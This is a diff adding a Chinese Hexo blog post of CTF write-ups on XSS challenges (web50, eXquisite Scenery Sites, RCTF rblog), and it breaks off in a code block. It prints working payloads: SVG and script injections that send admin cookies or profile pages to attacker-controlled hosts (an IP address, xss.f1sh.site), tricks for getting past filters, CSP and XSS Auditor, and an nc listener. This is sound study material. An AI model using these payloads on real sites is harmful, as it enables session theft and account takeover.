@@ -1,0 +1,1324 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<script>     
+(function(){         
+	if(''){
+		if (prompt('请输入文章密码') !== ''){
+			alert('密码错误');
+			history.back();
+		}
+	}
+})();
+</script>
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/black/pace-theme-flash.css" rel="stylesheet">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon2.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta name="keywords" content="CTF WEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS 题型记录">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/XSS题型记录/index.html">
+<meta property="og:site_name" content="CH4SER || 自闭室">
+<meta property="og:description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png">
+<meta property="og:updated_time" content="2019-09-07T07:23:56.448Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS 题型记录">
+<meta name="twitter:description" content="web50这个题目主要考察了XSS攻击，其中攻击的思路很有ssrf的味道。首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。然后有两个选项profile和report bug，前者记录了我们的账户信息。 后者包含了一个文本框，提交一些东西之后显示admin will take a look, blah blah, you know what it means，可">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2019/04/22/XSS题型记录/">
+
+
+
+
+
+  <title>XSS 题型记录 | CH4SER || 自闭室</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">CH4SER || 自闭室</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">龙信仰总是能抓住战士们的心，或许是因为他们不求言语吧。</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/22/XSS题型记录/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ch4ser">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/dogdog.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CH4SER || 自闭室">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">XSS 题型记录</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-22T01:50:29+08:00">
+                2019-04-22
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Post modified&#58;</span>
+              
+              <time title="Post modified" itemprop="dateModified" datetime="2019-09-07T15:23:56+08:00">
+                2019-09-07
+              </time>
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/题型记录/" itemprop="url" rel="index">
+                    <span itemprop="name">题型记录</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="web50"><a href="#web50" class="headerlink" title="web50"></a>web50</h2><p>这个题目主要考察了XSS攻击，其中攻击的思路很有<code>ssrf</code>的味道。<br>首先我们进入页面，里面有两个文本框，查看源码可以得知这是注册登陆框。我们随便注册一个。<br>然后有两个选项<code>profile</code>和<code>report bug</code>，前者记录了我们的账户信息。</p>
+<p>后者包含了一个文本框，提交一些东西之后显示<code>admin will take a look, blah blah, you know what it means</code>，可以推测我们<code>上传的东西都会被管理员查看</code>，那么存在<code>client-attack</code>，最有可能是xss攻击了。</p>
+<p>然后在几个地方尝试XSS注入，发现上传的文件中可以传入xss脚本，并且可以执行，验证脚本如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      alert(<span class="string">'XSS!'</span>);</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
+
+<p>在发送之后。我们要把上传文件的<code>url</code>通过<code>report bug</code>上传给管理员。<br>注意<code>content-type后面需要空一行，content-type的类型也要声明成image/svg+xml</code>，通过访问回显出来的图片url可以发现执行成功。</p>
+<p>下一步尝试将拿admin的<code>cookie</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------18467633426500</span><br><span class="line">Content-Disposition: form-data; name="avatar"; filename="fu.svg"</span><br><span class="line">Content-Type: image/svg+xml</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">window</span>.open(<span class="string">"http://207.148.64.125:1234/?$&#123;document.cookie&#125;"</span>)</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br><span class="line">-----------------------------18467633426500--</span><br></pre></td></tr></table></figure>
+
+<p>然后服务器上开nc服务监听。但是并没有东西回显，很有可能是因为<code>httponly</code>的缘故。<code>在httponly下，js是无法操作cookie的</code>。</p>
+<p>但是还有一个方法，管理员在访问我们上传的东西的时候，我们的脚本可以让他去访问他自己的profile，而且在访问的时候肯定是携带自己的cookie的，那么我们可以在脚本中将他访问之后得到的内容直接发送到我们自己的服务器上，这样绕过了cookie安全策略.(<code>原本常规做法是先获取cookie然后亲自去访问profile的,但是这次我们直接让admin自己去访问profile,省却了获取cookie的环节</code>)</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span> <span class="tag">&lt;<span class="name">svg</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">      xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (xhr.readyState === <span class="number">4</span>) &#123;</span></span><br><span class="line"><span class="javascript">          <span class="keyword">var</span> xhr2 = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">          xhr2.open(<span class="string">"POST"</span>, <span class="string">"http://url:port/"</span>);</span></span><br><span class="line">          xhr2.send(xhr.responseText);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;   </span><br><span class="line"><span class="javascript">      xhr.open(<span class="string">"GET"</span>, <span class="string">"http://web50.zajebistyc.tf/profile/admin"</span>);</span></span><br><span class="line"><span class="javascript">      xhr.withCredentials = <span class="literal">true</span>;</span></span><br><span class="line">      xhr.send();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这里的<code>url:port</code>推荐使用<code>burpsuite</code>的<code>burpcollaborator</code>，但是我的炸了，所以选择使用自己的服务器，使用<code>nc -lvvkp 1234</code>来监听信息。如果一次不行可以再重来一下，我试了两次就出来了flag。</p>
+<p><img src="http://ww1.sinaimg.cn/large/0062HBMaly1g1bi9k6pfbj30tk0j7aan.jpg" alt></p>
+<blockquote>
+<p>关于这道题目的一点思考:</p>
+<p>经过搜索, 我发现XMLHttprequest默认情况下允许向不同源发送请求, 但是同源策略会阻止读取响应内容, 这似乎并不重要, 重要的是我们的请求是否可以将我们想要发送的httponly-cookie发送出去, 在web前端黑客技术揭秘这本书中,提到了,如果要带上会话信息来发送请求, 就要设置withCredentials的值为true.</p>
+<p>设置HttpOnly属性，Cookie盗窃的威胁并没有彻底消除，因为cookie还是有可能传递的过程中被监听捕获后信息泄漏, 在这道题中就是这样.</p>
+</blockquote>
+<h2 id="eXquisite-Scenery-Sites-boot2root"><a href="#eXquisite-Scenery-Sites-boot2root" class="headerlink" title="eXquisite Scenery Sites(boot2root)"></a>eXquisite Scenery Sites(boot2root)</h2><p>这是一道xss题目，注入点在<code>username</code>上面，有长度限制<code>80</code>字符，过滤关键字：<code>scipt</code>和<code>.</code>，<code>script</code>大小写绕过，原来的<code>document.cookie</code>改写成<code>document[&#39;cookie&#39;]</code>，<br>将<code>ip地址转化为长整数类型</code>，省略http来节省长度空间。最终payload如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=1&amp;Message=&lt;scriPt&gt;document[&apos;location&apos;]=&apos;//3482599549:8/?&apos;%2bdocument[&apos;cookie&apos;];&lt;/sCript&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Rctf-rblog"><a href="#Rctf-rblog" class="headerlink" title="Rctf rblog"></a>Rctf rblog</h2><p>点击查看网页源代码，发现<code>rblog.js</code> ，进入看看，里面提供了一个<code>/api/v2/posts</code> 。</p>
+<p>访问之后把<code>posts</code> 换成其他的东西，发现<code>v2/</code>后面的内容会以字符串形式呈现，并在字符串的开头加上了斜杆。尝试<a href="http://rblog.2019.rctf.rois.io/api/v2/aaaaa" target="_blank" rel="noopener">http://rblog.2019.rctf.rois.io/api/v2/aaaaa</a><img>  或者是其他的标签来验证是否存在反射性XSS，但是并没有解析 ，在<code>header</code> 部分如下：</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/58318343-24b48200-7e4a-11e9-9bed-625dfb6ef869.png" alt="image"></p>
+<p>返回的数据依旧是<code>application/json</code> 说明图片标签并没有被解析。</p>
+<p>然后需要一点脑洞，或者搜索能力，<code>v2</code> 是版本号，那么换成<code>v1</code> 访问试一试。同样测试是否存在反射XSS 漏洞 ： <a href="https://rblog.2019.rctf.rois.io/api/v1/" target="_blank" rel="noopener">https://rblog.2019.rctf.rois.io/api/v1/</a><img>，这次返回如下</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/58318897-46facf80-7e4b-11e9-9702-87e89cf4afbe.png" alt="image"></p>
+<p>看，<code>&lt;img&gt;</code> 作为<code>html</code> 标签解析了，但是还有<code>csp</code> 需要绕过</p>
+<p><code>Content-Security-Policy: default-src &#39;self&#39;; object-src &#39;none&#39;</code> </p>
+<p>然后看题目给的提示：</p>
+<blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; API supports JSONP.</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<p>关于<code>JSONP</code> 和<code>callback</code> ，我看到了一段话，有助于理解：</p>
+<blockquote>
+<p>客户端把回调函数的名字传送给服务端，<br>然后服务端生成一段js代码且代码中包含着对回调函数的调用，<br>然后服务端把这段代码返回给客户端，<br>然后客户端执行这段代码的过程中调用了回调函数，<br>然后你就可以在回调函数里面处理数据了</p>
+</blockquote>
+<p>结合下面几个链接应该就可以弄懂了。</p>
+<p><a href="https://www.zhihu.com/question/20235590" target="_blank" rel="noopener">https://www.zhihu.com/question/20235590</a></p>
+<p><a href="http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html" target="_blank" rel="noopener">http://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html</a></p>
+<p><a href="https://juejin.im/entry/59f2f4ec518825411570156c" target="_blank" rel="noopener">https://juejin.im/entry/59f2f4ec518825411570156c</a></p>
+<p>测试一下<code>https://rblog.2019.rctf.rois.io/api/v1/posts?callback=test</code>，返回：</p>
+<p><img src="https://user-images.githubusercontent.com/40637063/58321041-9c38e000-7e4f-11e9-805d-b0620180836c.png" alt="image"></p>
+<p><code>callback</code> 后面的参数会包裹网页内容并呈现在网页上，那么就可以用反射型的XSS。</p>
+<figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58321250-3b5dd780-7e50-11e9-8fc2-fa4ff8d9a4ee.png)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">可以看到斜杆被转义了。。。把``script``部分换成其他符号测试一下，发现``,`` ``&quot;`` ``/``也被转义了，选择``html``编码可以绕过。</span><br><span class="line"></span><br><span class="line">```&lt;iframe srcdoc=&amp;#60;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#32;&amp;#115;&amp;#114;&amp;#99;&amp;#61;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#115;&amp;#58;&amp;#47;&amp;#47;&amp;#114;&amp;#98;&amp;#108;&amp;#111;&amp;#103;&amp;#46;&amp;#50;&amp;#48;&amp;#49;&amp;#57;&amp;#46;&amp;#114;&amp;#99;&amp;#116;&amp;#102;&amp;#46;&amp;#114;&amp;#111;&amp;#105;&amp;#115;&amp;#46;&amp;#105;&amp;#111;&amp;#47;&amp;#97;&amp;#112;&amp;#105;&amp;#47;&amp;#118;&amp;#49;&amp;#47;&amp;#112;&amp;#111;&amp;#115;&amp;#116;&amp;#115;&amp;#63;&amp;#99;&amp;#97;&amp;#108;&amp;#108;&amp;#98;&amp;#97;&amp;#99;&amp;#107;&amp;#61;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&amp;#59;&amp;#99;&amp;#111;&amp;#110;&amp;#115;&amp;#111;&amp;#108;&amp;#101;&amp;#46;&amp;#108;&amp;#111;&amp;#103;&amp;#62;&amp;#60;&amp;#47;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#62;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>内容是：</p>
+<figure class="highlight plain"><figcaption><span>srcdoc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">相当于把``alert(1);console.lot(XXXXXXXXXXX)`` 呈现在页面上之后把他们当做script脚本执行。当然，传入之前要先进行url编码，毕竟井号会被视为锚点。</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365573-0063ae80-7ef9-11e9-94e9-7e1f6df04af7.png)</span><br><span class="line"></span><br><span class="line">在``firefox``行得通，但是在``chrome``下面会被拦截。</span><br><span class="line"></span><br><span class="line">关于``XSS-Auditor`` 我找到以下一段话：</span><br><span class="line"></span><br><span class="line">&gt; XSS Auditor takes a black list approach to identify dangerous characters and tags supplied in request parameters. It also attempts to match query parameters with content to identify injection points. If the query parameter can’t be matched to content in the response, the auditor will not be triggered. Because the browser will never have insight to server-side code, an application that mangles an XSS payload will always render the XSS auditor useless in preventing attacks.</span><br><span class="line"></span><br><span class="line">也就是说，如果后端对我们输入的url进行了某种处理的话，就可以导致url部分和页面内容部分不一致，从而构成对``XSS-auditor`` 的绕过。</span><br><span class="line"></span><br><span class="line">那么进行一波fuzz。发现中文符号（比如``￥`` ``·`` ``。`` ``，`` ）都会被转成类似于如下的形式</span><br><span class="line"></span><br><span class="line">![image](https://user-images.githubusercontent.com/40637063/58365956-1031c180-7efe-11e9-95a2-ed16f8970795.png)</span><br><span class="line"></span><br><span class="line">那么最后的payload就是：</span><br><span class="line"></span><br><span class="line">```https://rblog.2019.rctf.rois.io/api/v1/%3Ciframe%20srcdoc=(很多个中文句号)%26%2360%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2332%3B%26%23115%3B%26%23114%3B%26%2399%3B%26%2361%3B%26%2334%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%23115%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23114%3B%26%2398%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2346%3B%26%2350%3B%26%2348%3B%26%2349%3B%26%2357%3B%26%2346%3B%26%23114%3B%26%2399%3B%26%23116%3B%26%23102%3B%26%2346%3B%26%23114%3B%26%23111%3B%26%23105%3B%26%23115%3B%26%2346%3B%26%23105%3B%26%23111%3B%26%2347%3B%26%2397%3B%26%23112%3B%26%23105%3B%26%2347%3B%26%23118%3B%26%2349%3B%26%2347%3B%26%23112%3B%26%23111%3B%26%23115%3B%26%23116%3B%26%23115%3B%26%2363%3B%26%2399%3B%26%2397%3B%26%23108%3B%26%23108%3B%26%2398%3B%26%2397%3B%26%2399%3B%26%23107%3B%26%2361%3B%26%23112%3B%26%2397%3B%26%23114%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%2399%3B%26%2397%3B%26%23116%3B%26%23105%3B%26%23111%3B%26%23110%3B%26%2346%3B%26%23104%3B%26%23114%3B%26%23101%3B%26%23102%3B%26%2361%3B%26%2339%3B%26%23104%3B%26%23116%3B%26%23116%3B%26%23112%3B%26%2358%3B%26%2347%3B%26%2347%3B%26%23120%3B%26%23115%3B%26%23115%3B%26%2346%3B%26%23102%3B%26%2349%3B%26%23115%3B%26%23104%3B%26%2346%3B%26%23115%3B%26%23105%3B%26%23116%3B%26%23101%3B%26%2347%3B%26%2363%3B%26%2339%3B%26%2337%3B%26%2350%3B%26%2398%3B%26%23100%3B%26%23111%3B%26%2399%3B%26%23117%3B%26%23109%3B%26%23101%3B%26%23110%3B%26%23116%3B%26%2346%3B%26%2399%3B%26%23111%3B%26%23111%3B%26%23107%3B%26%23105%3B%26%23101%3B%26%2359%3B%26%2399%3B%26%23111%3B%26%23110%3B%26%23115%3B%26%23111%3B%26%23108%3B%26%23101%3B%26%2346%3B%26%23108%3B%26%23111%3B%26%23103%3B%26%2334%3B%26%2362%3B%26%2360%3B%26%2347%3B%26%23115%3B%26%2399%3B%26%23114%3B%26%23105%3B%26%23112%3B%26%23116%3B%26%2362%3B%3E</span><br></pre></td></tr></table></figure>
+
+<p>其中的内容如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://rblog.2019.rctf.rois.io/api/v1/posts?callback=parent.location.href=&apos;http://xss.f1sh.site/?&apos;%2bdocument.cookie;console.log&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>将这部分进行html实体编码之后包裹进<code>&lt;iframe srcdoc=(很多中文句号){放置位置}&gt;</code>，然后进行整体url编码之后传入，就得到了flag。</p>
+<h2 id="RCTF2019-jails-amp-password"><a href="#RCTF2019-jails-amp-password" class="headerlink" title="RCTF2019 jails &amp;password"></a>RCTF2019 jails &amp;password</h2><p><a href="https://xz.aliyun.com/t/5216" target="_blank" rel="noopener">https://xz.aliyun.com/t/5216</a></p>
+<p><a href="https://github.com/nytr0gen/rctf-2019-writeups#jail" target="_blank" rel="noopener">https://github.com/nytr0gen/rctf-2019-writeups#jail</a></p>
+<p><a href="https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md" target="_blank" rel="noopener">https://github.com/liuhack/writeups/blob/master/2019/RCTF/jail/Readme.md</a></p>
+<p><a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password" target="_blank" rel="noopener">https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password</a></p>
+<p>Unexpected Solution</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span 